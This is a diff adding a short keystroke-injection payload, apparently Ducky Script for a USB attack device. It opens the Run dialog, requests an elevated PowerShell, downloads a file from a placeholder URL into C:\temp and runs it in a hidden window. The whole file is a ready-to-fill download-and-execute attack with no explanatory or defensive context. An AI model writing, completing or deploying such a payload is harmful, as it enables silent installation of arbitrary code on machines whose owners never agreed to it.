@@ -1,0 +1,17 @@
+DELAY 750  
+GUI r 
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000  
+STRING cd C:\temp
+ENTER
+DELAY 750
+STRING Invoke-WebRequest -Uri <FILE URL> -OutFile <OUTPUT FILE>
+ENTER
+DELAY 750
+STRING Start-Process C:\temp\<OUTPUT FILE> -ArgumentList "<OPTIONAL>" -WindowStyle hidden
+ENTER
+DELAY 750
+STRING exit
+ENTER
